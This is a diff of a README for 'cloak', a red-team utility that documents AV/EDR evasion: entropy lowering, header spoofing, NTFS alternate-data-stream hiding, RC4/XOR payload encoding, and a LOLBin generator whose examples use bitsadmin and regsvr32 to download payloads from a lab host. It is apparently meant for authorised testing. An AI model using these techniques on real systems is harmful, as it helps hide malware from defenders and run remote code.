@@ -1,6 +1,6 @@
 # cloak.ps1 / cloak.py
 
-A PowerShell and Python utility for polyglot/carrier file embedding, payload encoding, header spoofing, and file hashing. Built for CTF, red team, and advanced file manipulation workflows.
+A PowerShell and Python red team file utility for encoding, entropy manipulation, header spoofing, alternate data streams, and LOLBin command generation.
 
 ---
 
@@ -11,38 +11,21 @@ A PowerShell and Python utility for polyglot/carrier file embedding, payload enc
 | `cloak.ps1` | PowerShell 5.1+ | Windows (built-in) |
 | `cloak.py` | Python 3.9+ | Cross-platform, stdlib only |
 
-Both versions are **fully compatible** — a polyglot file created with one can be extracted with the other. The trailer format, magic marker, and all embedding strategies are identical.
-
 ---
 
 ## Modes
 
 | Mode | Description |
 |------|-------------|
-| `Embed` | Hide a payload inside a carrier file |
-| `Extract` | Recover a hidden payload from a polyglot file |
-| `Info` | Inspect a file for an embedded payload marker |
-| `Util` | Encode, rename, or spoof a file without embedding |
-
----
-
-## Embedding Strategies
-
-| Strategy | Layout | Best For |
-|----------|--------|----------|
-| `Append` *(default)* | `[carrier][payload][trailer]` | JPEG, PNG, MP4, EXE — parsers ignore trailing data |
-| `Prepend` | `[trailer][payload][carrier]` | ZIP, RAR — formats parsed from the end |
-| `Insert` | `[carrier[:offset]][payload][trailer][carrier[offset:]]` | Custom offsets inside a file |
-
-> **Note:** Append and Prepend are auto-detected on extraction. Insert is not auto-detectable — the offset must be known.
-
-> **Real image tip:** Use a real image file as your carrier with `Append`. Most JPEG viewers stop reading at the end-of-image marker (`FF D9`) and ignore trailing data, so the file will still open normally.
+| `Info` | Inspect a file — size, entropy score, header fingerprint, magic-byte match |
+| `Util` | Encode, lower entropy, ADS read/write, rename extension, spoof header |
+| `Generate` | LOLBin command generator with OS compatibility notes |
 
 ---
 
 ## Encoding Techniques
 
-When `-Encode` (PS1) or `--encode` (Python) is passed, an interactive menu appears. The encoding is applied to the payload **before** embedding (in `Embed` mode) or directly to the file (in `Util` mode).
+When `-Encode` (PS1) or `--encode` (Python) is passed in `Info` or `Util` mode, an interactive menu appears.
 
 | # | Technique | Output type | Reversible |
 |---|-----------|-------------|------------|
@@ -52,31 +35,96 @@ When `-Encode` (PS1) or `--encode` (Python) is passed, an interactive menu appea
 | 4 | Reverse bytes | Binary | Yes — reverse again |
 | 5 | XOR → Base64 | Text | Yes — Base64 decode, then XOR |
 | 6 | XOR → Hex | Text | Yes — parse hex, then XOR |
+| 7 | RC4 | Binary | Yes — RC4 again with the same key |
 
-### XOR Key Format
+### XOR / RC4 Key Format
 
-When XOR is selected you will be prompted for a key. Both formats are accepted:
-
+XOR accepts a single byte key:
 ```
 XOR key: 0x41    # hex
 XOR key: 65      # decimal
 ```
 
-Both use the same key (`A` / `0x41`). The key is a single byte (0–255).
+RC4 accepts a string or hex key:
+```
+RC4 key: mysecretkey
+RC4 key: 0xDEADBEEF
+```
 
 ### When to use each
 
-**Base64** — good default for making binary data text-safe. Output is ~33% larger than input. Paste-friendly, widely recognised.
+**Base64** — good default for making binary data text-safe. Output is ~33% larger. Paste-friendly.
 
-**Hex** — human-readable representation of every byte. Output is 2× the input size. Easy to inspect manually.
+**Hex** — human-readable byte representation. Output is 2× input size. Easy to inspect manually.
 
-**XOR** — lightweight obfuscation. Output is the same size as input (binary). Not encryption — use a non-obvious key and combine with Base64 or Hex for transport.
+**XOR** — lightweight obfuscation. Same size as input. Not encryption — combine with Base64 or Hex for transport.
 
-**Reverse** — trivial byte-flip. Useful for defeating naive pattern matching on file headers or known byte sequences.
+**Reverse** — trivial byte-flip. Defeats naive pattern matching on file headers or known byte sequences.
 
-**XOR → Base64** — XOR first for obfuscation, then Base64 for text-safe output. Good balance of obfuscation and transportability.
+**XOR → Base64** — XOR for obfuscation, Base64 for text-safe transport. Good balance.
 
-**XOR → Hex** — XOR first, then hex-encode. Fully printable output, easy to paste into scripts or logs.
+**XOR → Hex** — XOR then hex-encode. Fully printable, easy to paste into scripts.
+
+**RC4** — stream cipher. Same size as input. Stronger than XOR, still lightweight. Appears frequently in real malware because it's small and fast.
+
+---
+
+## Entropy Manipulation
+
+High entropy files (> 7.2) are flagged by most AV/EDR as packed or encrypted. The `--lower-entropy` flag pads the file with structured low-entropy junk to bring the score down into a benign range before encoding.
+
+```
+< 6.5   looks benign
+6.5–7.2  mildly suspicious
+> 7.2   almost certainly flagged
+```
+
+The `info` mode always shows the entropy score with a colour-coded label.
+
+---
+
+## Alternate Data Streams (ADS)
+
+Windows/NTFS only. Stores data in a named stream attached to a file — invisible to Explorer and `dir`, no change to the visible file size.
+
+```
+file.txt          ← normal file, dir shows this
+file.txt:hidden   ← ADS stream, invisible to casual inspection
+```
+
+**Streams survive:** renaming on the same NTFS volume, moving within the same drive, `robocopy`.
+
+**Streams are stripped by:** copying to another drive via Explorer, uploading/emailing, copying to FAT32/exFAT, zipping.
+
+Use `dir /r` or `Get-Item -Stream *` to see streams on a file.
+
+---
+
+## LOLBin Generator
+
+Generates ready-to-run commands for 18 Windows built-in binaries (Living Off the Land Binaries). Each entry includes OS compatibility and detection notes so you know what will work on the target before you try it.
+
+**Key caveats by LOLBin:**
+
+| LOLBin | OS compatibility | Detection |
+|--------|-----------------|-----------|
+| `wmic` | ⚠ Removed Win 11 22H2+ / Server 2025 | Low on older builds |
+| `ieexec` | ⚠ Removed Win 11 (requires IE) | Low when present |
+| `certutil` | All Windows | Often blocked by ASR rules |
+| `mshta` | All Windows | Often blocked by ASR rules |
+| `bitsadmin` | All Windows (deprecated but present) | Low — different code path to certutil |
+| `powershell` | All Windows | AMSI + ScriptBlock logging on Win 10+ |
+| `regsvr32` | All Windows | Classic AppLocker bypass — ASR may block |
+| `forfiles` | All Windows | Very low |
+| `pcalua` | All Windows | Very low — rarely in EDR rule sets |
+| `odbcconf` | All Windows | Very low |
+| `rundll32` | All Windows | Monitored — use with obfuscation |
+| `installutil` | All Windows with .NET | Medium |
+| `regasm` | All Windows with .NET | Low |
+| `regsvcs` | All Windows with .NET | Low |
+| `cscript` / `wscript` | All Windows | WSH may be disabled via GPO |
+| `cmstp` | All Windows | UAC bypass patched in some builds |
+| `msiexec` | All Windows | Medium |
 
 ---
 
@@ -86,143 +134,152 @@ Both use the same key (`A` / `0x41`). The key is a single byte (0–255).
 
 | Parameter | Type | Description |
 |-----------|------|-------------|
-| `-Mode` | `Embed \| Extract \| Info \| Util` | Operation to run *(required)* |
-| `-Carrier` | string | Carrier file for embedding, or input file for Util mode |
-| `-Payload` | string | File to hide inside the carrier *(Embed only)* |
+| `-Mode` | `Info \| Util \| Generate` | Operation to run *(required)* |
+| `-Carrier` | string | Input file |
 | `-Output` | string | Output file path |
-| `-Strategy` | `Append \| Prepend \| Insert` | Embedding strategy *(default: Append)* |
-| `-InsertOffset` | long | Byte offset for Insert strategy *(default: 0)* |
-| `-Encode` | switch | Show interactive encoding menu before processing |
-| `-NewExtension` | string | Replace all extensions with this one (e.g. `.pdf`) |
-| `-AddExtension` | string | Append to existing filename (e.g. `.bak` → `file.txt.bak`) |
-| `-SpoofHeader` | switch | Overwrite first bytes with magic bytes matching the target extension |
-| `-ShowHashes` | switch | Display MD5, SHA1, and SHA256 of the output file |
+| `-Encode` | switch | Show interactive encoding menu |
+| `-LowerEntropy` | double | Target Shannon entropy e.g. `6.0` — pads before encoding |
+| `-NewExtension` | string | Replace all extensions (e.g. `.pdf`) |
+| `-AddExtension` | string | Append to filename (e.g. `.bak`) |
+| `-SpoofHeader` | switch | Overwrite header with magic bytes for target extension |
+| `-ShowHashes` | switch | Display MD5, SHA1, SHA256 |
 | `-Quiet` | switch | Suppress the banner |
+| `-AdsWrite` | string | Write a file into an ADS stream on `-Carrier` |
+| `-AdsRead` | switch | Read ADS stream from `-Carrier` to `-Output` |
+| `-AdsList` | switch | List all ADS streams on `-Carrier` |
+| `-AdsDelete` | switch | Delete a named ADS stream |
+| `-AdsStream` | string | Stream name (e.g. `hidden` → `file.txt:hidden`) |
+| `-LolBin` | string | LOLBin name — interactive menu if omitted |
+| `-LolBinFile` | string | Local payload file path |
+| `-LolBinUrl` | string | Remote URL for download cradles |
+| `-LolBinArg` | string | Extra argument (e.g. DLL export name for rundll32) |
+| `-List` | switch | List all LOLBins with OS notes and exit |
 
 ### Python (`cloak.py`)
 
-| Flag | Short | Type | Description |
-|------|-------|------|-------------|
-| `mode` | — | positional | `embed \| extract \| info \| util` *(required)* |
-| `--carrier` | `-c` | string | Carrier file, or input file for util mode |
-| `--payload` | `-p` | string | File to hide inside the carrier *(embed only)* |
-| `--output` | `-o` | string | Output file path |
-| `--strategy` | `-s` | string | `append \| prepend \| insert` *(default: append)* |
-| `--insert-offset` | `-i` | int | Byte offset for insert strategy *(default: 0)* |
-| `--encode` | `-e` | flag | Show interactive encoding menu |
-| `--new-extension` | `-n` | string | Replace all extensions (e.g. `.pdf`) |
-| `--add-extension` | `-a` | string | Append to filename (e.g. `.bak`) |
-| `--spoof-header` | `-x` | flag | Overwrite header with magic bytes |
-| `--show-hashes` | `-H` | flag | Display MD5, SHA1, SHA256 |
-| `--quiet` | `-q` | flag | Suppress the banner |
-
-### `-NewExtension` vs `-AddExtension`
-
-```
--NewExtension ".pdf"   →  file.bin.enc  becomes  file.pdf
--AddExtension ".bak"   →  file.txt      becomes  file.txt.bak
-```
+| Flag | Short | Description |
+|------|-------|-------------|
+| `mode` | — | `info \| util \| generate` *(required)* |
+| `--carrier` | `-c` | Input file |
+| `--output` | `-o` | Output file path |
+| `--encode` | `-e` | Show interactive encoding menu |
+| `--lower-entropy` | — | Target entropy e.g. `6.0` |
+| `--new-extension` | `-n` | Replace all extensions (e.g. `.pdf`) |
+| `--add-extension` | `-a` | Append to filename (e.g. `.bak`) |
+| `--spoof-header` | `-x` | Overwrite header with magic bytes |
+| `--show-hashes` | `-H` | Display MD5, SHA1, SHA256 |
+| `--quiet` | `-q` | Suppress the banner |
+| `--ads-write` | — | Write payload into ADS on `--carrier` |
+| `--ads-read` | — | Read ADS stream to `--output` |
+| `--ads-list` | — | List all ADS streams |
+| `--ads-delete` | — | Delete a named ADS stream |
+| `--ads-stream` | — | Stream name |
+| `--lolbin` | — | LOLBin name — interactive menu if omitted |
+| `--lolbin-file` | — | Local payload file path |
+| `--lolbin-url` | — | Remote URL |
+| `--lolbin-arg` | — | Extra argument |
+| `--list` | — | List all LOLBins and exit |
 
 ---
 
 ## Examples
 
-### Basic embed and extract
-
-```powershell
-# PowerShell
-.\cloak.ps1 -Mode Embed -Carrier photo.jpg -Payload secret.zip -Output poly.jpg
-.\cloak.ps1 -Mode Extract -Carrier poly.jpg -Output recovered.zip
-```
-
-```bash
-# Python
-python cloak.py embed -c photo.jpg -p secret.zip -o poly.jpg
-python cloak.py extract -c poly.jpg -o recovered.zip
-```
-
-### Embed with encoding + header spoof
-
-```powershell
-# PowerShell
-.\cloak.ps1 -Mode Embed -Carrier document.docx -Payload data.bin `
-    -Output disguised.pdf -Encode -NewExtension ".pdf" -SpoofHeader -ShowHashes
-```
-
-```bash
-# Python
-python cloak.py embed -c document.docx -p data.bin -o disguised.pdf \
-    --encode --new-extension .pdf --spoof-header --show-hashes
-```
-
-### Embed using Prepend (ZIP-compatible)
-
-```powershell
-.\cloak.ps1 -Mode Embed -Strategy Prepend -Carrier archive.zip -Payload note.txt -Output poly.zip
-```
-
-```bash
-python cloak.py embed -s prepend -c archive.zip -p note.txt -o poly.zip
-```
-
 ### Inspect a file
 
 ```powershell
-.\cloak.ps1 -Mode Info -Carrier poly.jpg -ShowHashes
+.\cloak.ps1 -Mode Info -Carrier payload.exe -ShowHashes
 ```
-
 ```bash
-python cloak.py info -c poly.jpg --show-hashes
+python cloak.py info -c payload.exe --show-hashes
 ```
 
-Output (both versions):
+Output:
 ```
-[+] Layout detected              : Append
-    Magic marker at offset       : 42183
-    Payload at offset            : 38762
-    Carrier portion              : 38.76 KB
-    Payload portion              : 3.34 KB
-    Trailer                      : 16 bytes
+[*] File           : payload.exe
+[*] Size           : 38.76 KB (39690 bytes)
+[*] Entropy        : 7.431 / 8.0  (high — likely packed/encrypted)
+[*] First 16 bytes : 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00
+[+] Header matches known format(s): .exe, .dll
 ```
 
-### Encode a file and rename it
+### Lower entropy then encode
 
 ```powershell
-.\cloak.ps1 -Mode Util -Carrier payload.exe -Encode -NewExtension ".txt"
+.\cloak.ps1 -Mode Util -Carrier payload.exe -LowerEntropy 6.0 -Encode
 ```
-
 ```bash
-python cloak.py util -c payload.exe --encode --new-extension .txt
+python cloak.py util -c payload.exe --lower-entropy 6.0 --encode
 ```
 
-### Spoof magic bytes only
+### Encode + rename + spoof header
 
 ```powershell
-.\cloak.ps1 -Mode Util -Carrier file.bin -NewExtension ".pdf" -SpoofHeader
+.\cloak.ps1 -Mode Util -Carrier payload.exe -Encode -NewExtension ".jpg" -SpoofHeader -ShowHashes
 ```
-
 ```bash
-python cloak.py util -c file.bin --new-extension .pdf --spoof-header
+python cloak.py util -c payload.exe --encode --new-extension .jpg --spoof-header --show-hashes
 ```
 
-### Add a double extension
+### Write payload into ADS
 
 ```powershell
-.\cloak.ps1 -Mode Util -Carrier file.txt -AddExtension ".pdf"
+.\cloak.ps1 -Mode Util -Carrier readme.txt -AdsWrite payload.enc -AdsStream hidden
 ```
-
 ```bash
-python cloak.py util -c file.txt --add-extension .pdf
+python cloak.py util -c readme.txt --ads-write payload.enc --ads-stream hidden
 ```
 
-### Cross-version: embed with PS1, extract with Python
+### Read ADS stream back out
 
 ```powershell
-.\cloak.ps1 -Mode Embed -Carrier photo.jpg -Payload secret.zip -Output poly.jpg
+.\cloak.ps1 -Mode Util -Carrier readme.txt -AdsRead -AdsStream hidden -Output recovered.bin
+```
+```bash
+python cloak.py util -c readme.txt --ads-read --ads-stream hidden -o recovered.bin
 ```
 
+### List all ADS streams on a file
+
+```powershell
+.\cloak.ps1 -Mode Util -Carrier readme.txt -AdsList
+```
 ```bash
-python cloak.py extract -c poly.jpg -o recovered.zip
+python cloak.py util -c readme.txt --ads-list
+```
+
+### List all LOLBins with OS notes
+
+```powershell
+.\cloak.ps1 -Mode Generate -List
+```
+```bash
+python cloak.py generate --list
+```
+
+### Generate LOLBin commands interactively
+
+```powershell
+.\cloak.ps1 -Mode Generate -LolBinFile payload.dll
+```
+```bash
+python cloak.py generate --lolbin-file payload.dll
+```
+
+Filters the menu to LOLBins compatible with `.dll` — select one to generate all variants.
+
+### Generate specific LOLBin
+
+```powershell
+.\cloak.ps1 -Mode Generate -LolBin bitsadmin -LolBinFile test.txt -LolBinUrl http://10.10.10.1/test.txt
+```
+```bash
+python cloak.py generate --lolbin bitsadmin --lolbin-file test.txt --lolbin-url http://10.10.10.1/test.txt
+```
+
+### Save generated commands to file
+
+```bash
+python cloak.py generate --lolbin regsvr32 --lolbin-file payload.sct --lolbin-url http://10.10.10.1/p.sct -o commands.txt
 ```
 
 ---
@@ -251,23 +308,11 @@ python cloak.py extract -c poly.jpg -o recovered.zip
 
 ---
 
-## How the Trailer Works
-
-Every polyglot file created by this tool contains a 16-byte trailer that records where the payload is:
-
-```
-[ MAGIC (8 bytes) ][ PAYLOAD LENGTH as int64-LE (8 bytes) ]
-  DE AD BE EF CA FE BA BE
-```
-
-On extraction the tool checks the **tail** of the file for Append layout and the **head** for Prepend layout — no strategy hint needed. This trailer format is identical in both versions, making them fully interoperable.
-
----
-
 ## Notes
 
 - No intermediate temp files are left behind after any operation
-- Original carrier and payload files are never modified
+- Original files are never modified — output always goes to a new file
 - Paths with spaces are fully supported
+- ADS features require Windows/NTFS — gracefully errors on Linux/Mac
 - `cloak.ps1` requires PowerShell 5.1 or later
 - `cloak.py` requires Python 3.9 or later, no external packages needed
